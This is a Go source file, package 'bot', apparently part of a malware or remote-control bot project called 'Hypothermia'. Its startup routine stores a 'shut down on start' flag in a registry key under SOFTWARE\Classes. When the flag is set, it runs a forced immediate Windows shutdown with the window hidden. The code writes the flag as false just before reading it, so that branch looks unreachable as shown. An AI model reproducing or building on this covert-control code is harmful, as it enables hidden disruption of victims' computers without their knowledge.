package bot

import (
	"os/exec"
	"syscall"

	"Hypothermia/config"
	"Hypothermia/src/utils"
)

const (
	SHUT_DOWN_ON_START string = "SDOS"

	TRUE  string = "0x0000"
	FALSE string = "0x0001"
)

func OnStartup() {
	if config.Debugging {
		return
	}

	utils.MakeRegistryKey("SOFTWARE\\Classes\\" + config.SettingsName)

	utils.SetRegistryVal(
		"SOFTWARE\\Classes\\"+config.SettingsName,
		SHUT_DOWN_ON_START,
		FALSE,
	)

	sdos, err := utils.GetRegistryVal(
		"SOFTWARE\\Classes\\"+config.SettingsName,
		SHUT_DOWN_ON_START,
	)

	if err == nil && sdos == TRUE {
		cmd := exec.Command("shutdown", "/s", "/f", "/t", "0")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}

		cmd.Run()
	}
}
